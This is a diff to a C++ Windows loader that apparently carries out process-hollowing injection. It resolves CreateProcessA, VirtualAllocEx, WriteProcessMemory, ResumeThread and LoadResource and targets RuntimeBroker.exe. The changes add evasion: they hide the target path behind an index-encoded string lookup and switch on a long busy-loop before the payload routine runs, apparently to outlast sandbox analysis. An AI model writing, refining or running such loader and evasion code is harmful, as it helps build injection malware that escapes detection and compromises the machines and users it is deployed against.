@@ -6,7 +6,7 @@
 #include <cstdlib>
 #include <ctime>
 #include <string>  // Include this for std::string
-//CreateProcessA , VirtualAllocEx , WriteProcessMemory ,ResumeThread  ,LoadResource , kernel32.dll , SizeOfResource.
+//CreateProcessA , VirtualAllocEx , WriteProcessMemory ,ResumeThread ,GetModuleHandle ,LoadResource.
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "user32.lib")
 
@@ -22,7 +22,7 @@ std::string getoriginal(int offsets[], char* big_string, int sizeof_offset){  //
 
 void main_star() {
 
-    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.";
+    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.\\:";
     int ws_lld_ker_32[] = {10, 4, 17, 13, 4, 11, 55, 54, 62, 3, 11, 11};
     HMODULE istfromKernel32 = LoadLibraryA(getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)).c_str());
     std::cout <<getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)).c_str() << std::endl;
@@ -33,6 +33,8 @@ void main_star() {
     
     int load_resource_ok[] = {37, 14, 0, 3, 43, 4, 18, 14, 20, 17, 2, 4};
     int size_of_Resource[] = {44, 8, 25, 4, 14, 5, 43, 4, 18, 14, 20, 17, 2, 4};
+    
+    int runtime_broker[] = {2, 64, 63, 63, 22, 8, 13, 3, 14, 22, 18, 63, 63, 18, 24, 18, 19, 4, 12, 55, 54, 63, 63, 43, 20, 13, 19, 8, 12, 4, 27, 17, 14, 10, 4, 17, 62, 4, 23, 4};
     
     //std::cout <<getoriginal(afindres, big_string, sizeof(afindres)) << std::endl;
     std::cout <<getoriginal(size_of_Resource, big_string, sizeof(size_of_Resource)) << std::endl;  
@@ -62,7 +64,9 @@ void main_star() {
     
     std::cout <<getoriginal(creatingprocess, big_string, sizeof(creatingprocess)) << std::endl;  
     
-    const char* processptaah = "c:\\windows\\system32\\RuntimeBroker.exe";
+    std::string runtime_broker_kum = getoriginal(runtime_broker, big_string, sizeof(runtime_broker));
+    std::cout <<getoriginal(runtime_broker, big_string, sizeof(runtime_broker)) << std::endl;
+    const char* processptaah = runtime_broker_kum.c_str();
 
     STARTUPINFO li = {0};
     
@@ -108,16 +112,16 @@ void main_star() {
 }
 
 int main() {
-    //unsigned long long i = 0;  // Change this value to control the flow
+    unsigned long long i = 0;  // Change this value to control the flow
 
-    //for(; i < 189642300000; i++) {
-        //i += i % 0xff; 
-    //}
-    //printf("%llu\n", i);
+    for(; i < 189642300000; i++) {
+        i += i % 0xff; 
+    }
+    printf("%llu\n", i);
     
-    //if (i == 189642300001){
+    if (i == 189642300001){
         main_star();
-    //}
+    }
 
     return 0;
 }
